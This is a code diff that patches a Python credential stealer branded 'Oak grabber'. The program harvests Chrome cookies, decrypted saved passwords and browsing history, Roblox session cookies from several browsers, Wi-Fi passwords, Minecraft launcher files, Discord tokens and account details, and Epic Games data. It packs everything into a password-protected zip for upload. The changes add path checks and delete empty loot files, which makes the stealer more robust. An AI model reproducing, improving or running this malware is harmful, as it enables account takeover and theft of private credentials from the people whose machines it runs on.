@@ -245,11 +245,6 @@ def main():
       pass
 
 
-
-    headers = {
-        'Content-Type': 'application/json',
-        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
-    }
     try:disk = str(psutil.disk_usage('/')[0] / 1024 ** 3).split(".")[0]
     except:disk = "N/A"
     try:about = f"DISK: {disk}GB"
@@ -293,11 +288,10 @@ def main():
     try: mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
     except: mac = 'N/A'
     def cookies():
-     try:
-        with open(".\\google cookies.txt", "w", encoding="utf-8") as f:
+        if os.path.exists(appdata + '\\Google\\Chrome\\User Data'):
+         with open(".\\google cookies.txt", "w", encoding="utf-8") as f:
             f.write("Google Chrome Cookies | Oak grabber by dynasty#3624 | https://github.com/j0taro/Oak-token-Grabber\n\n")
-
-        for path in google_paths:
+         for path in google_paths:
             path += '\\Network\\Cookies'
             if os.path.exists(path):
                 copy2(path, "Cookievault.db")
@@ -309,18 +303,18 @@ def main():
                         value = decrypt_password(value,masterkey)
                         if host and name and value != "":
                             f.write("""===============================\nSite: {:<30} \nName: {:<30} \nValue: {:<30}\n""".format(host, name, value))
-
                 cursor.close()
                 conn.close()
                 os.remove("Cookievault.db")
-     except:
-        pass
+        else:
+            pass
+
     def passwords():
-     try:
-        google_pass = ".\\google passwords.txt"
-        with open(google_pass, "w", encoding="utf-8") as f:
+        if os.path.exists(appdata + '\\Google\\Chrome\\User Data'):
+         google_pass = ".\\google passwords.txt"
+         with open(google_pass, "w", encoding="utf-8") as f:
             f.write(f"Google Chrome Passwords | Oak grabber by dynasty#3624 | https://github.com/j0taro/Oak-token-Grabber\n\n")
-        for path in google_paths:
+         for path in google_paths:
             path += '\\Login Data'
             if os.path.exists(path):
                 copy2(path, "Loginvault.db")
@@ -336,15 +330,14 @@ def main():
                 cursor.close()
                 conn.close()
                 os.remove("Loginvault.db")
-     except:
-        os.remove("google passwords.txt")
-        pass
+        else:
+             pass
     def history():
-     try:
-        google_history = ".\\google history.txt"
-        with open(google_history, "w", encoding="utf-8") as f:
+        if os.path.exists(appdata + '\\Google\\Chrome\\User Data'):
+         google_history = ".\\google history.txt"
+         with open(google_history, "w", encoding="utf-8") as f:
             f.write(f"Google Chrome history | Oak grabber by dynasty#3624 | https://github.com/j0taro/Oak-token-Grabber\n\n")
-        for path in google_paths:
+         for path in google_paths:
             path += '\\History'
             if os.path.exists(path):
                 copy2(path, "Historyvault.db")
@@ -365,9 +358,9 @@ def main():
                 cursor.close()
                 conn.close()
                 os.remove("Historyvault.db")
-     except:
-        os.remove("google history.txt")
-        pass
+        else:
+           pass
+
     def sysinfo():
         tree = fr'''System Info  | Oak grabber by dynasty#3624 | https://github.com/j0taro/Oak-token-Grabber
 HWID: {hardwareid}
@@ -400,38 +393,41 @@ Processes running
         with open("system info.txt", 'w') as fp:
            fp.write(str(tree))
     def robloxcookies():
+         c = ""
          try:
            cookie = str(browser_cookie3.chrome(domain_name='roblox.com'))
-           c = cookie.split('ROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
+           c += cookie.split('ROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
          except:
-           c = ""
+           pass
          try:
            cookie = str(browser_cookie3.firefox(domain_name='roblox.com'))
-           c2 = cookie.split('ROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
+           c += cookie.split('\nROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
          except:
-           c2 = ""
+          pass
          try:
            cookie = str(browser_cookie3.opera(domain_name='roblox.com'))
-           c3 = cookie.split('ROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
+           c += cookie.split('\nROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
          except:
-           c3 = ""
+           pass
          try:
            cookie = str(browser_cookie3.edge(domain_name='roblox.com'))
-           c4 = cookie.split('ROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
+           c += cookie.split('\nROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
          except:
-           c4 = ""
+            pass
          try:
            cookie = str(browser_cookie3.chromium(domain_name='roblox.com'))
-           c5 = cookie.split('ROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
+           c += cookie.split('\nROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
          except:
-           c5 = ""
+           pass
          try:
           cookie = str(browser_cookie3.brave(domain_name='roblox.com'))
-          c6 = cookie.split('ROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
+          c += cookie.split('\nROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
          except:
-          c6 = ""
+          pass
          with open("roblox cookies.txt", "w") as fs:
-          fs.write(f"Roblox cookies | Oak grabber by dynasty#3624 | https://github.com/j0taro/Oak-token-Grabber\n\n{c}\n{c2}\n{c3}\n{c4}\n{c5}\n{c6}")
+          fs.write(f"Roblox cookies | Oak grabber by dynasty#3624 | https://github.com/j0taro/Oak-token-Grabber\n\n{c}")
+         if c == "":
+            os.remove("roblox cookies.txt")
     def wifistealer():
      try:
         data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
@@ -456,17 +452,16 @@ Processes running
      except:
         pass
     def mc():
-     try:
-        minecraft = ntpath.join(wiseoaktree, 'Minecraft')
-        smh = os.makedirs(minecraft, exist_ok=True)
         mc = ntpath.join(roaming, '.minecraft')
-        to_grab = ['launcher_accounts.json', 'launcher_profiles.json', 'usercache.json', 'launcher_log.txt']
-        for smh in to_grab:
+        if os.path.exists(mc):
+         minecraft = ntpath.join(wiseoaktree, 'Minecraft')
+         smh = os.makedirs(minecraft, exist_ok=True)
+         to_grab = ['launcher_accounts.json', 'launcher_profiles.json', 'usercache.json', 'launcher_log.txt']
+         for smh in to_grab:
             if ntpath.exists(ntpath.join(mc, smh)):
                 shutil.copy2(ntpath.join(mc, smh), minecraft)
-     except:
-        shutil.rmtree("minecraft")
-        pass
+         pass
+        else:pass
     def discordinfo():
         info = ""
         lol = ""
@@ -668,6 +663,8 @@ Email: {email if email else ""}\n"""
             
         with open ("discord info.txt","w") as f:
          f.write(str(info))
+        if info == "":
+            os.remove("discord info.txt")
 
     def get_data():
         epic = appdata + "\\EpicGamesLauncher\\Saved\\Config\\Windows\\GameUserSettings.ini"
@@ -679,7 +676,9 @@ Email: {email if email else ""}\n"""
                         if line.startswith("Data="):
                             g.write(line.split('Data=')[1].strip())
             else:
+                g.close()
                 os.remove("Epic games data.txt")
+                pass
     def zip():
             password = bytes('{}'.format(zippass),encoding='utf8')
             os.chdir(temp)
@@ -710,14 +709,14 @@ Email: {email if email else ""}\n"""
                    zf.close()
 
     def upload():
-     vaildc = 0
-     fr = token
-     lmao = fr.split("\n")
-     for i in lmao:
-       if i:
-              vaildc += 1
      lol = ""
      try:
+      vaildc = 0
+      fr = token
+      lmao = fr.split("\n")
+      for i in lmao:
+       if i:
+              vaildc += 1
       headers = {
         'Authorization': token,
         'Content-Type': 'application/json'
@@ -747,7 +746,7 @@ Email: {email if email else ""}\n"""
       lol += f"""**Phone Number:** `{phone_number if phone_number else "N/A"}`\n**Email:** `{email if email else ""}`\n**Token:** `{token}`"""
      except:
         lol += f"""**Username:** `N/A`\n**User ID:**`N/A`\n**Creation Date:** `N/A`\n**Avatar URL:** `N/A`\n**Nitro:** `N/A`"""
-        lol += f"""**Phone Number:**` N/A`\n**Email:** `N/A`\n**Token:** `N/A`"""
+        lol += f"""\n**Phone Number:** `N/A`\n**Email:** `N/A`\n**Token:** `N/A`"""
      os.chdir(wiseoaktree)
      fc = 0
      f = f"📁{os.path.basename(wiseoaktree)}\n"
